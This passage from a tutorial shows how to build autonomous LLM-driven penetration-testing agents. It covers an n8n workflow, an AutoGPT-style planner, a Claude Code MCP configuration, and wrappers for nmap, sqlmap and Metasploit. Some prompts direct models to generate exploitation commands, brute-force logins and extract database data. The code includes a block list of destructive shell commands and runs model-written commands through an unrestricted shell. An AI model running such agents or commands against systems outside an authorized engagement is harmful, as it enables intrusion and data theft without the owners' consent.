        "type": "n8n-nodes-base.writeFile",
        "position": [1100, 300],
        "parameters": {
          "fileName": "/data/reports/pentest_{{$now.format('yyyyMMdd_HHmmss')}}.md",
          "fileContent": "={{$json.output}}"
        }
      },
      {
        "name": "Respond",
        "type": "n8n-nodes-base.respondToWebhook",
        "position": [1300, 300],
        "parameters": {
          "respondWith": "json",
          "responseBody": "={{JSON.stringify({status: 'complete', report: $json.output})}}"
        }
      }
    ],
    "connections": {
      "Webhook Trigger": {"main": [["Parse Target"]]},
      "Parse Target": {"main": [["Nmap Scan", "WhatWeb Scan"]]},
      "Nmap Scan": {"main": [["AI Analysis"]]},
      "WhatWeb Scan": {"main": [["AI Analysis"]]},
      "AI Analysis": {"main": [["Save Report"]]},
      "Save Report": {"main": [["Respond"]]}
    }
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-play" label="Trigger n8n Workflow"}
  ```bash [Trigger via Webhook]
  curl -X POST http://localhost:5678/webhook/pentest \
    -H "Content-Type: application/json" \
    -d '{"target": "192.168.1.100", "scan_type": "full"}'
  ```

  ```python [Python Trigger]
  import requests

  response = requests.post(
      "http://localhost:5678/webhook/pentest",
      json={"target": "192.168.1.100", "scan_type": "full"}
  )
  print(response.json())
  ```
  :::
::

---

## Step 6 — AutoGPT / AgentGPT Integration

### AutoGPT with Pentesting Tools

```python [agents/autogpt_pentest.py]
#!/usr/bin/env python3
"""
AutoGPT-style autonomous pentesting agent.
Self-directed agent that plans and executes pentesting tasks.
"""

import os
import json
import subprocess
from datetime import datetime
from langchain_ollama import ChatOllama
from langchain_core.messages import SystemMessage, HumanMessage
from dotenv import load_dotenv

load_dotenv()


class AutoPentestAgent:
    """Autonomous pentesting agent with planning and execution capabilities."""

    def __init__(self, target: str, model: str = "llama3.1:8b"):
        self.target = target
        self.llm = ChatOllama(
            model=model,
            base_url=os.getenv("OLLAMA_HOST", "http://localhost:11434"),
            temperature=0.1,
            num_ctx=8192
        )
        self.memory = []
        self.findings = []
        self.plan = []
        self.iteration = 0
        self.max_iterations = 25
        self.evidence_dir = "./evidence"
        os.makedirs(self.evidence_dir, exist_ok=True)
        os.makedirs("./reports", exist_ok=True)

        self.available_tools = {
            "nmap": "Network scanner — nmap [args] <target>",
            "nikto": "Web vulnerability scanner — nikto -h <url>",
            "gobuster": "Directory brute forcer — gobuster dir -u <url> -w <wordlist>",
            "whatweb": "Web technology fingerprinter — whatweb <url>",
            "nuclei": "Template vulnerability scanner — nuclei -u <url> -tags <tags>",
            "sqlmap": "SQL injection scanner — sqlmap -u '<url>' --batch",
            "curl": "HTTP client — curl -sv <url>",
            "dig": "DNS lookup — dig <domain>",
            "whois": "WHOIS lookup — whois <domain>"
        }

    def _exec(self, cmd: str, timeout: int = 300) -> str:
        """Execute a command safely."""
        # Safety check
        blocked = ["rm ", "mkfs", "dd ", "shutdown", "reboot", ":()", "fork"]
        if any(b in cmd.lower() for b in blocked):
            return "[BLOCKED] Dangerous command rejected"

        base_cmd = cmd.split()[0]
        if base_cmd not in self.available_tools and base_cmd not in ["echo", "cat", "grep", "head"]:
            return f"[BLOCKED] Tool '{base_cmd}' not in allowed list"

        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            output = (result.stdout + result.stderr)[:8000]

            # Save evidence
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            with open(f"{self.evidence_dir}/{ts}_{base_cmd}.txt", "w") as f:
                json.dump({"cmd": cmd, "output": output, "timestamp": ts}, f, indent=2)

            return output
        except subprocess.TimeoutExpired:
            return f"[TIMEOUT] Command timed out after {timeout}s"
        except Exception as e:
            return f"[ERROR] {str(e)}"

    def plan_phase(self) -> list:
        """Generate a pentesting plan using LLM."""
        prompt = f"""You are an expert penetration tester. Create a detailed, step-by-step
pentesting plan for the target: {self.target}

Available tools: {json.dumps(self.available_tools, indent=2)}

Previous findings: {json.dumps(self.memory[-5:], indent=2) if self.memory else 'None yet'}

Generate a JSON array of steps. Each step must have:
- "phase": reconnaissance/scanning/enumeration/vulnerability_assessment/exploitation
- "action": description of what to do
- "command": exact shell command to run
- "reason": why this step is important

Return ONLY valid JSON array. Example:
[
  {{"phase": "reconnaissance", "action": "Port scan", "command": "nmap -sT -sV {self.target}", "reason": "Identify open ports"}}
]"""

        response = self.llm.invoke([
            SystemMessage(content="You are a penetration testing planner. Respond with ONLY valid JSON."),
            HumanMessage(content=prompt)
        ])

        try:
            # Extract JSON from response
            content = response.content
            start = content.find("[")
            end = content.rfind("]") + 1
            if start >= 0 and end > start:
                self.plan = json.loads(content[start:end])
            else:
                self.plan = [{"phase": "reconnaissance", "action": "Port scan",
                             "command": f"nmap -sT -sV -sC --open {self.target}",
                             "reason": "Initial port discovery"}]
        except json.JSONDecodeError:
            self.plan = [{"phase": "reconnaissance", "action": "Port scan",
                         "command": f"nmap -sT -sV -sC --open {self.target}",
                         "reason": "Initial port discovery"}]

        return self.plan

    def analyze_results(self, step: dict, output: str) -> dict:
        """Use LLM to analyze tool output and generate findings."""
        prompt = f"""Analyze this pentesting tool output:

Command: {step.get('command', '')}
Phase: {step.get('phase', '')}
Output:
{output[:4000]}

Provide analysis in JSON format:
{{
  "summary": "brief summary of findings",
  "vulnerabilities": ["list of discovered vulnerabilities"],
  "next_steps": ["suggested follow-up actions"],
  "severity": "info/low/medium/high/critical"
}}

Return ONLY valid JSON."""

        response = self.llm.invoke([
            SystemMessage(content="You are a security analyst. Analyze tool output. Return ONLY JSON."),
            HumanMessage(content=prompt)
        ])

        try:
            content = response.content
            start = content.find("{")
            end = content.rfind("}") + 1
            if start >= 0 and end > start:
                return json.loads(content[start:end])
        except json.JSONDecodeError:
            pass

        return {"summary": "Analysis pending", "vulnerabilities": [], "next_steps": [], "severity": "info"}

    def run(self):
        """Execute the autonomous pentesting workflow."""
        print(f"\n{'='*60}")
        print(f"  AutoPentest Agent — Target: {self.target}")
        print(f"{'='*60}\n")

        # Phase 1: Planning
        print("[*] Phase 1: Creating pentest plan...")
        self.plan_phase()
        print(f"[+] Generated {len(self.plan)} step plan\n")

        for i, step in enumerate(self.plan):
            if self.iteration >= self.max_iterations:
                print(f"\n[!] Max iterations ({self.max_iterations}) reached. Stopping.")
                break

            self.iteration += 1
            phase = step.get("phase", "unknown")
            action = step.get("action", "unknown")
            command = step.get("command", "")

            print(f"\n[Step {i+1}/{len(self.plan)}] [{phase.upper()}] {action}")
            print(f"  Command: {command}")

            # Execute
            output = self._exec(command)
            print(f"  Output: {output[:200]}{'...' if len(output) > 200 else ''}")

            # Analyze
            analysis = self.analyze_results(step, output)
            print(f"  Analysis: {analysis.get('summary', 'N/A')}")

            if analysis.get("vulnerabilities"):
                for v in analysis["vulnerabilities"]:
                    print(f"  [!] VULN: {v}")
                    self.findings.append({
                        "phase": phase,
                        "vulnerability": v,
                        "severity": analysis.get("severity", "info"),
                        "command": command,
                        "evidence": output[:2000]
                    })

            self.memory.append({
                "step": i+1,
                "phase": phase,
                "action": action,
                "command": command,
                "analysis": analysis
            })

        # Generate Report
        self._generate_report()
        return self.findings

    def _generate_report(self):
        """Generate final penetration test report."""
        report = f"""# Penetration Test Report
## Target: {self.target}
## Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
## Agent: AutoPentest v1.0

---

### Executive Summary
Automated penetration test performed against {self.target}.
Total steps executed: {self.iteration}
Total findings: {len(self.findings)}

### Findings Summary

| # | Severity | Vulnerability | Phase |
|---|----------|---------------|-------|
"""
        for i, f in enumerate(self.findings, 1):
            report += f"| {i} | {f['severity'].upper()} | {f['vulnerability']} | {f['phase']} |\n"

        report += "\n### Detailed Findings\n\n"
        for i, f in enumerate(self.findings, 1):
            report += f"""#### Finding {i}: {f['vulnerability']}
- **Severity:** {f['severity'].upper()}
- **Phase:** {f['phase']}
- **Command:** `{f['command']}`
- **Evidence:**
```
{f['evidence'][:1000]}
```

"""

        report += "\n### Methodology\n\n"
        for m in self.memory:
            report += f"- **Step {m['step']}** [{m['phase']}]: {m['action']}\n"

        filepath = f"./reports/autopentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        with open(filepath, "w") as f:
            f.write(report)
        print(f"\n[+] Report saved: {filepath}")


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "scanme.nmap.org"
    agent = AutoPentestAgent(target)
    findings = agent.run()
    print(f"\n[+] Total findings: {len(findings)}")
```

```bash [Run AutoPentest Agent]
python3 agents/autogpt_pentest.py 192.168.1.100
```

---

## Step 7 — Claude Code Integration

### Claude Code with MCP for Pentesting

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Direct Usage"}
  ```bash [Start Claude Code with MCP]
  cd ~/ai-pentest-agent
  claude --mcp-config ~/.claude/claude_code_config.json
  ```

  ```text [Example Claude Code Session]
  > Scan 192.168.1.100 for all open ports and identify services.
    Then run vulnerability assessment on any web services found.
    Save all findings as evidence.

  Claude will:
  1. Call kali-tools MCP → nmap_scan
  2. Analyze the output
  3. Call kali-tools MCP → nikto_scan (on web ports)
  4. Call kali-tools MCP → nuclei_scan
  5. Call kali-tools MCP → save_finding
  6. Provide structured analysis
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Custom CLAUDE.md"}
  Create a project-specific instruction file:

  ```markdown [CLAUDE.md]
  # AI Pentesting Agent Configuration

  ## Role
  You are an expert penetration tester with access to Kali Linux tools via MCP.

  ## Available MCP Tools
  - nmap_scan: Network scanning (port discovery, service detection, vuln scripts)
  - nikto_scan: Web vulnerability scanning
  - gobuster_scan: Directory/file brute forcing
  - sqlmap_scan: SQL injection testing
  - hydra_attack: Brute force authentication
  - whatweb_scan: Web technology fingerprinting
  - nuclei_scan: Template-based vulnerability scanning
  - custom_command: Execute allowed tools
  - read_evidence: Review saved evidence

  ## Methodology
  Always follow this order:
  1. Reconnaissance → Nmap port scan, WhatWeb fingerprinting
  2. Enumeration → Gobuster directory scan, service-specific enum
  3. Vulnerability Assessment → Nikto, Nuclei, Nmap vuln scripts
  4. Exploitation → SQLMap, targeted exploits (with confirmation)
  5. Documentation → Save all findings with evidence

  ## Rules
  - NEVER run destructive commands
  - Always explain before executing tools
  - Save every significant finding
  - Rate limit scans appropriately
  - Ask for confirmation before exploitation
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Programmatic API"}
  ```python [claude_pentest_api.py]
  #!/usr/bin/env python3
  """Use Claude API directly for pentesting analysis."""

  import anthropic
  import os
  from dotenv import load_dotenv

  load_dotenv()

  client = anthropic.Anthropic(api_key=os.getenv("ANTHROPIC_API_KEY"))


  def analyze_scan_results(scan_output: str, context: str = "") -> str:
      """Send scan results to Claude for analysis."""
      response = client.messages.create(
          model="claude-sonnet-4-20250514",
          max_tokens=4096,
          system="""You are an expert penetration tester analyzing scan results.
          Identify all vulnerabilities, misconfigurations, and attack vectors.
          Rate severity as Critical/High/Medium/Low/Info.
          Suggest specific next steps and exploitation techniques.""",
          messages=[{
              "role": "user",
              "content": f"""Analyze these penetration test results:

  Context: {context}

  Scan Output:
  {scan_output}

  Provide:
  1. Summary of findings
  2. Vulnerabilities discovered (with severity)
  3. Recommended next steps
  4. Specific exploitation techniques to try"""
          }]
      )
      return response.content[0].text


  def generate_exploit_command(vulnerability: str, target: str) -> str:
      """Generate exploitation commands for a vulnerability."""
      response = client.messages.create(
          model="claude-sonnet-4-20250514",
          max_tokens=2048,
          system="You are a penetration testing expert. Generate safe, targeted exploit commands.",
          messages=[{
              "role": "user",
              "content": f"Generate exploitation commands for: {vulnerability}\nTarget: {target}\nProvide multiple approaches."
          }]
      )
      return response.content[0].text


  if __name__ == "__main__":
      # Example: Analyze Nmap output
      nmap_output = """
      PORT    STATE SERVICE VERSION
      22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
      80/tcp  open  http    Apache httpd 2.4.18
      443/tcp open  ssl     Apache httpd 2.4.18
      3306/tcp open mysql   MySQL 5.7.25
      """

      analysis = analyze_scan_results(nmap_output, "Initial Nmap scan of target")
      print(analysis)
  ```
  :::
::

---

## Step 8 — Custom Tool Creation

### Tool Wrapper Framework

```python [tools/tool_wrapper.py]
#!/usr/bin/env python3
"""
Custom tool wrapper framework for AI agent integration.
Creates standardized wrappers around pentesting tools.
"""

import subprocess
import shlex
import json
import os
import re
import xml.etree.ElementTree as ET
from abc import ABC, abstractmethod
from datetime import datetime
from typing import Optional
from dataclasses import dataclass, field


@dataclass
class ToolResult:
    """Standardized tool execution result."""
    tool: str
    command: str
    raw_output: str
    parsed_data: dict
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    success: bool = True
    error: Optional[str] = None
    evidence_path: Optional[str] = None


class BaseTool(ABC):
    """Base class for all pentesting tool wrappers."""

    def __init__(self, name: str, timeout: int = 300):
        self.name = name
        self.timeout = timeout
        self.evidence_dir = os.getenv("EVIDENCE_DIR", "./evidence")
        os.makedirs(self.evidence_dir, exist_ok=True)

    def execute(self, command: str) -> ToolResult:
        """Execute a command and return standardized result."""
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True,
                timeout=self.timeout
            )
            raw = result.stdout + result.stderr
            parsed = self.parse_output(raw)

            tool_result = ToolResult(
                tool=self.name,
                command=command,
                raw_output=raw,
                parsed_data=parsed,
                success=result.returncode == 0
            )

            # Save evidence
            tool_result.evidence_path = self._save_evidence(tool_result)
            return tool_result

        except subprocess.TimeoutExpired:
            return ToolResult(
                tool=self.name, command=command, raw_output="",
                parsed_data={}, success=False,
                error=f"Timeout after {self.timeout}s"
            )
        except Exception as e:
            return ToolResult(
                tool=self.name, command=command, raw_output="",
                parsed_data={}, success=False, error=str(e)
            )

    @abstractmethod
    def parse_output(self, raw_output: str) -> dict:
        """Parse raw tool output into structured data."""
        pass

    @abstractmethod
    def build_command(self, **kwargs) -> str:
        """Build the command string from parameters."""
        pass

    def run(self, **kwargs) -> ToolResult:
        """Build and execute command."""
        command = self.build_command(**kwargs)
        return self.execute(command)

    def _save_evidence(self, result: ToolResult) -> str:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(self.evidence_dir, f"{ts}_{self.name}.json")
        with open(filepath, "w") as f:
            json.dump({
                "tool": result.tool,
                "command": result.command,
                "timestamp": result.timestamp,
                "success": result.success,
                "parsed": result.parsed_data,
                "raw_output": result.raw_output[:50000]
            }, f, indent=2)
        return filepath


# ===========================
# Nmap Wrapper
# ===========================
class NmapTool(BaseTool):
    def __init__(self):
        super().__init__("nmap", timeout=600)

    def build_command(self, target: str, ports: str = "-",
                      scan_type: str = "-sT", extra: str = "-sV -sC") -> str:
        if ports == "-":
            port_flag = ""
        else:
            port_flag = f"-p {ports}"
        return f"nmap {scan_type} {port_flag} {extra} -oX - {shlex.quote(target)}"

    def parse_output(self, raw_output: str) -> dict:
        """Parse Nmap XML output."""
        parsed = {"hosts": []}
        try:
            # Try XML parsing first
            if "<?xml" in raw_output:
                root = ET.fromstring(raw_output)
                for host in root.findall('.//host'):
                    host_data = {
                        "ip": "",
                        "hostname": "",
                        "ports": [],
                        "os": ""
                    }
                    addr = host.find('.//address[@addrtype="ipv4"]')
                    if addr is not None:
                        host_data["ip"] = addr.get("addr", "")

                    hostname = host.find('.//hostname')
                    if hostname is not None:
                        host_data["hostname"] = hostname.get("name", "")

                    for port in host.findall('.//port'):
                        state = port.find('state')
                        service = port.find('service')
                        if state is not None and state.get("state") == "open":
                            port_info = {
                                "port": port.get("portid"),
                                "protocol": port.get("protocol"),
                                "service": service.get("name", "") if service is not None else "",
                                "version": service.get("version", "") if service is not None else "",
                                "product": service.get("product", "") if service is not None else ""
                            }
                            host_data["ports"].append(port_info)

                    parsed["hosts"].append(host_data)
            else:
                # Fallback: parse text output
                parsed["raw_text"] = raw_output
        except ET.ParseError:
            parsed["raw_text"] = raw_output

        return parsed


# ===========================
# SQLMap Wrapper
# ===========================
class SQLMapTool(BaseTool):
    def __init__(self):
        super().__init__("sqlmap", timeout=900)

    def build_command(self, url: str, level: int = 1, risk: int = 1,
                      extra: str = "--batch --dbs") -> str:
        return f"sqlmap -u {shlex.quote(url)} --level={level} --risk={risk} {extra}"

    def parse_output(self, raw_output: str) -> dict:
        parsed = {
            "vulnerable": False,
            "injection_type": [],
            "databases": [],
            "dbms": ""
        }

        if "is vulnerable" in raw_output.lower() or "sqlmap identified" in raw_output.lower():
            parsed["vulnerable"] = True

        # Extract injection types
        for itype in ["boolean-based", "time-based", "UNION query", "error-based", "stacked queries"]:
            if itype.lower() in raw_output.lower():
                parsed["injection_type"].append(itype)

        # Extract databases
        db_matches = re.findall(r'\[\*\]\s+(\S+)', raw_output)
        parsed["databases"] = db_matches

        # Extract DBMS
        dbms_match = re.search(r'back-end DBMS:\s*(.+)', raw_output)
        if dbms_match:
            parsed["dbms"] = dbms_match.group(1).strip()

        return parsed


# ===========================
# Nikto Wrapper
# ===========================
class NiktoTool(BaseTool):
    def __init__(self):
        super().__init__("nikto", timeout=600)

    def build_command(self, target: str, port: int = 80, extra: str = "") -> str:
        return f"nikto -h {shlex.quote(target)} -p {port} {extra}"

    def parse_output(self, raw_output: str) -> dict:
        parsed = {"findings": [], "server": "", "interesting": []}

        for line in raw_output.split("\n"):
            line = line.strip()
            if line.startswith("+ "):
                finding = line[2:]
                parsed["findings"].append(finding)
                if any(kw in finding.lower() for kw in
                       ["vulnerability", "outdated", "cve", "osvdb", "xss", "injection"]):
                    parsed["interesting"].append(finding)

            if "Server:" in line:
                parsed["server"] = line.split("Server:")[1].strip()

        return parsed


# ===========================
# Gobuster Wrapper
# ===========================
class GobusterTool(BaseTool):
    def __init__(self):
        super().__init__("gobuster", timeout=300)

    def build_command(self, url: str, mode: str = "dir",
                      wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                      extra: str = "-t 30 --no-error -q") -> str:
        return f"gobuster {mode} -u {shlex.quote(url)} -w {wordlist} {extra}"

    def parse_output(self, raw_output: str) -> dict:
        parsed = {"directories": [], "files": [], "status_codes": {}}
        for line in raw_output.split("\n"):
            match = re.search(r'(/\S+)\s+\(Status:\s*(\d+)\)', line)
            if match:
                path, code = match.group(1), int(match.group(2))
                entry = {"path": path, "status": code}
                if path.endswith("/"):
                    parsed["directories"].append(entry)
                else:
                    parsed["files"].append(entry)
                parsed["status_codes"][code] = parsed["status_codes"].get(code, 0) + 1
        return parsed


# ===========================
# Metasploit Wrapper
# ===========================
class MetasploitTool(BaseTool):
    def __init__(self):
        super().__init__("metasploit", timeout=600)

    def build_command(self, module: str, options: dict, payload: str = "") -> str:
        opts = "; ".join(f"set {k} {v}" for k, v in options.items())
        payload_cmd = f"; set PAYLOAD {payload}" if payload else ""
        return f'msfconsole -q -x "use {module}; {opts}{payload_cmd}; run; exit"'

    def parse_output(self, raw_output: str) -> dict:
        parsed = {"sessions": [], "loot": [], "success": False}
        if "session" in raw_output.lower() and "opened" in raw_output.lower():
            parsed["success"] = True
        if "Meterpreter session" in raw_output:
            parsed["sessions"].append("meterpreter")
        return parsed


# ===========================
# Usage Example
# ===========================
if __name__ == "__main__":
    # Nmap example
    nmap = NmapTool()
    result = nmap.run(target="scanme.nmap.org", scan_type="-sT", extra="-sV --top-ports 100")
    print(f"Nmap result: {json.dumps(result.parsed_data, indent=2)}")

    # Gobuster example
    gobuster = GobusterTool()
    result = gobuster.run(url="http://scanme.nmap.org")
    print(f"Gobuster result: {json.dumps(result.parsed_data, indent=2)}")
```

### Prompt Engineering for Pentesting

```python [prompts/pentest_prompts.py]
#!/usr/bin/env python3
"""
Prompt templates for pentesting AI agents.
Optimized for different phases and LLM providers.
"""


SYSTEM_PROMPTS = {
    "general": """You are an expert penetration tester and security researcher.
You follow a systematic methodology: Recon → Scanning → Enumeration → Vulnerability Assessment → Exploitation → Post-Exploitation → Reporting.
You always explain your reasoning before taking action.
You document all findings with evidence.
You never run destructive commands.
You rate vulnerabilities using CVSS and describe business impact.""",

    "recon": """You are a reconnaissance specialist. Your goal is to gather as much
information about the target as possible without direct interaction.
Focus on: DNS records, WHOIS data, subdomains, email addresses, technology stack,
social media, leaked credentials, and publicly available information.
Organize findings by category and relevance.""",

    "scanning": """You are a network scanning expert. Analyze port scan results
and service fingerprints. For each open port:
1. Identify the service and exact version
2. Check for known CVEs for that version
3. Assess default credentials risk
4. Identify potential attack vectors
5. Recommend specific enumeration techniques""",

    "web_testing": """You are a web application security expert specializing in OWASP Top 10.
Test for: SQL Injection, XSS, CSRF, IDOR, SSRF, XXE, File Upload, LFI/RFI,
Authentication Bypass, Business Logic Flaws.
For each finding, provide:
- Vulnerability name and type
- CVSS score
- Proof of concept
- Business impact
- Remediation steps""",

    "exploit_analysis": """You are an exploitation specialist. Given a vulnerability,
determine the best exploitation approach:
1. Is there a public exploit? (searchsploit, ExploitDB, GitHub)
2. Is there a Metasploit module?
3. Can it be exploited manually?
4. What is the expected impact? (RCE, auth bypass, data leak)
5. What are the risks of exploitation?
Always prioritize safe, controlled exploitation techniques.""",

    "report_writer": """You are a professional penetration test report writer.
Create clear, actionable reports following this structure:
1. Executive Summary (non-technical, business impact focused)
2. Scope and Methodology
3. Risk Rating Summary (Critical/High/Medium/Low/Informational)
4. Detailed Findings (each with: Title, Severity, Description, Impact, PoC, Remediation)
5. Strategic Recommendations
6. Appendix (raw evidence, tool outputs)
Use professional language. Include CVSS scores. Reference CWE/CVE where applicable."""
}


TASK_TEMPLATES = {
    "initial_scan": """Perform an initial reconnaissance scan on target: {target}

Steps:
1. Run a TCP SYN scan on all 65535 ports
2. Identify all open ports and running services
3. Determine OS fingerprint if possible
4. List all findings in a structured table format
5. Recommend next enumeration steps based on discovered services""",

    "web_enum": """Enumerate the web application at: {target}

Steps:
1. Fingerprint web technologies (server, framework, CMS, languages)
2. Discover hidden directories and files
3. Check for common misconfigurations (directory listing, default pages, backups)
4. Identify input points (forms, parameters, APIs)
5. Check robots.txt, sitemap.xml, security.txt
6. Test for information disclosure in headers and error pages""",

    "vuln_assess": """Perform vulnerability assessment on: {target}
Discovered services: {services}

Steps:
1. Run automated vulnerability scanners (Nuclei, Nikto)
2. Check each service version for known CVEs
3. Test for default/weak credentials
4. Check SSL/TLS configuration
5. Test for injection vulnerabilities on web parameters
6. Rate each finding by severity and exploitability""",

    "sqli_test": """Test for SQL injection on: {target}
Parameters to test: {parameters}

Steps:
1. Test each parameter with basic SQLi payloads
2. Determine injection type (union, error, blind, time-based)
3. Identify the backend DBMS
4. If vulnerable, enumerate databases and tables
5. Extract sample data as proof of concept
6. Document the full exploitation chain""",

    "analyze_output": """Analyze the following {tool} output and provide a security assessment:

Target: {target}
Command: {command}
Output:
{output}

Provide:
1. Key findings summary
2. Identified vulnerabilities with severity
3. Interesting observations
4. Recommended follow-up actions
5. Any indicators of hardening or security controls"""
}


def get_prompt(prompt_type: str, **kwargs) -> str:
    """Get a formatted prompt template."""
    template = TASK_TEMPLATES.get(prompt_type, "")
    if template:
        return template.format(**kwargs)
    return ""


def get_system_prompt(role: str) -> str:
    """Get a system prompt for a specific role."""
    return SYSTEM_PROMPTS.get(role, SYSTEM_PROMPTS["general"])
```

---

## Step 9 — Memory Management & Multi-Agent Collaboration

### Agent Memory System

```python [memory/agent_memory.py]
#!/usr/bin/env python3
"""
Memory management for pentesting AI agents.
Supports short-term, long-term, and episodic memory.
"""

import json
import os
from datetime import datetime
from typing import Optional
from chromadb import PersistentClient
from sentence_transformers import SentenceTransformer


class AgentMemory:
    """Multi-layered memory system for pentesting agents."""

    def __init__(self, agent_id: str, persist_dir: str = "./data/memory"):
        self.agent_id = agent_id
        self.persist_dir = persist_dir
        os.makedirs(persist_dir, exist_ok=True)

        # Short-term memory (conversation buffer)
        self.short_term: list[dict] = []
        self.max_short_term = 50

        # Long-term memory (vector store)
        self.chroma = PersistentClient(path=os.path.join(persist_dir, "chroma"))
        self.model = SentenceTransformer('all-MiniLM-L6-v2')
        self._embed_fn = lambda texts: self.model.encode(texts).tolist()

        self.long_term = self.chroma.get_or_create_collection(
            name=f"memory_{agent_id}",
            metadata={"agent": agent_id}
        )

        # Episodic memory (session logs)
        self.session_file = os.path.join(persist_dir, f"session_{agent_id}.jsonl")

    def add_short_term(self, role: str, content: str, metadata: dict = None):
        """Add entry to short-term memory."""
        entry = {
            "role": role,
            "content": content,
            "timestamp": datetime.now().isoformat(),
            "metadata": metadata or {}
        }
        self.short_term.append(entry)
        if len(self.short_term) > self.max_short_term:
            # Move oldest to long-term
            old = self.short_term.pop(0)
            self.add_long_term(old["content"], old["metadata"])

        # Also save to episodic
        self._append_episodic(entry)

    def add_long_term(self, content: str, metadata: dict = None):
        """Add entry to long-term vector memory."""
        doc_id = f"{self.agent_id}_{datetime.now().strftime('%Y%m%d%H%M%S%f')}"
        embedding = self._embed_fn([content])[0]

        self.long_term.add(
            ids=[doc_id],
            documents=[content],
            embeddings=[embedding],
            metadatas=[metadata or {}]
        )

    def recall(self, query: str, n_results: int = 5) -> list[dict]:
        """Recall relevant memories using semantic search."""
        query_embedding = self._embed_fn([query])[0]

        results = self.long_term.query(
            query_embeddings=[query_embedding],
            n_results=n_results
        )

        memories = []
        if results["documents"]:
            for doc, meta, dist in zip(
                results["documents"][0],
                results["metadatas"][0],
                results["distances"][0]
            ):
                memories.append({
                    "content": doc,
                    "metadata": meta,
                    "relevance": 1 - dist  # Convert distance to similarity
                })

        return memories

    def get_context_window(self, max_entries: int = 10) -> str:
        """Get recent context for LLM prompt."""
        recent = self.short_term[-max_entries:]
        context = ""
        for entry in recent:
            context += f"[{entry['role']}] {entry['content']}\n\n"
        return context

    def _append_episodic(self, entry: dict):
        """Append to episodic session log."""
        with open(self.session_file, "a") as f:
            f.write(json.dumps(entry) + "\n")

    def save_finding(self, finding: dict):
        """Save a pentesting finding to long-term memory."""
        content = f"Finding: {finding.get('title', 'Unknown')} | " \
                  f"Severity: {finding.get('severity', 'info')} | " \
                  f"Description: {finding.get('description', '')}"

        self.add_long_term(content, {
            "type": "finding",
            "severity": finding.get("severity", "info"),
            "target": finding.get("target", ""),
            **finding
        })

    def get_all_findings(self) -> list:
        """Retrieve all saved findings."""
        return self.recall("vulnerability finding security issue", n_results=100)
```

### Multi-Agent Collaboration Setup

```python [agents/multi_agent.py]
#!/usr/bin/env python3
"""
Multi-agent collaboration system for pentesting.
Agents communicate through shared memory and message passing.
"""

import json
import os
import subprocess
from datetime import datetime
from typing import Optional
from langchain_ollama import ChatOllama
from langchain_core.messages import SystemMessage, HumanMessage

# Import memory
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from memory.agent_memory import AgentMemory
from prompts.pentest_prompts import get_system_prompt


class PentestAgent:
    """Individual pentesting agent with specialized role."""

    def __init__(self, agent_id: str, role: str, model: str = "llama3.1:8b",
                 tools: list = None):
        self.agent_id = agent_id
        self.role = role
        self.tools = tools or []
        self.memory = AgentMemory(agent_id)
        self.llm = ChatOllama(
            model=model,
            base_url=os.getenv("OLLAMA_HOST", "http://localhost:11434"),
            temperature=0.1
        )
        self.system_prompt = get_system_prompt(role)

    def think(self, task: str, context: str = "") -> str:
        """Process a task and generate response."""
        # Recall relevant memories
        memories = self.memory.recall(task, n_results=3)
        memory_context = "\n".join([m["content"] for m in memories])

        # Get recent conversation context
        recent = self.memory.get_context_window(5)

        prompt = f"""Task: {task}

Previous context: {recent}

Relevant knowledge: {memory_context}

Additional context: {context}

Analyze the above and provide your expert assessment. If you need to run a tool,
specify the exact command."""

        response = self.llm.invoke([
            SystemMessage(content=self.system_prompt),
            HumanMessage(content=prompt)
        ])

        result = response.content
        self.memory.add_short_term("assistant", result, {"task": task})
        return result

    def execute_tool(self, command: str, timeout: int = 300) -> str:
        """Execute a tool command."""
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=timeout
            )
            output = (result.stdout + result.stderr)[:8000]
            self.memory.add_short_term("tool", output, {"command": command})
            return output
        except Exception as e:
            return f"Error: {e}"

    def receive_message(self, from_agent: str, message: str):
        """Receive a message from another agent."""
        self.memory.add_short_term(
            "message",
            f"[From {from_agent}]: {message}",
            {"from": from_agent}
        )


class AgentOrchestrator:
    """Manages multi-agent collaboration."""

    def __init__(self, target: str):
        self.target = target
        self.agents = {}
        self.message_log = []
        self.shared_findings = []

        # Create specialized agents
        self.agents["recon"] = PentestAgent("recon_agent", "recon")
        self.agents["scanner"] = PentestAgent("scanner_agent", "scanning")
        self.agents["web"] = PentestAgent("web_agent", "web_testing")
        self.agents["exploit"] = PentestAgent("exploit_agent", "exploit_analysis")
        self.agents["reporter"] = PentestAgent("report_agent", "report_writer")

    def send_message(self, from_id: str, to_id: str, message: str):
        """Send message between agents."""
        self.message_log.append({
            "from": from_id, "to": to_id,
            "message": message,
            "timestamp": datetime.now().isoformat()
        })
        if to_id in self.agents:
            self.agents[to_id].receive_message(from_id, message)

    def run_collaborative_pentest(self):
        """Execute collaborative pentesting workflow."""
        print(f"\n[*] Starting multi-agent pentest against: {self.target}")

        # Phase 1: Recon agent performs initial scanning
        print("\n[Phase 1] Reconnaissance Agent")
        recon_result = self.agents["recon"].think(
            f"Perform initial reconnaissance on {self.target}. "
            f"Run: nmap -sT -sV -sC --open {self.target}"
        )
        nmap_output = self.agents["recon"].execute_tool(
            f"nmap -sT -sV -sC --open {self.target}"
        )
        print(f"  Recon: {recon_result[:200]}")

        # Share results with scanner
        self.send_message("recon", "scanner",
                         f"Nmap scan complete. Results:\n{nmap_output[:3000]}")

        # Phase 2: Scanner agent analyzes results
        print("\n[Phase 2] Scanning Agent")
        scan_analysis = self.agents["scanner"].think(
            f"Analyze these scan results and identify attack vectors:\n{nmap_output[:3000]}"
        )
        print(f"  Scanner: {scan_analysis[:200]}")

        # Share with web agent if web ports found
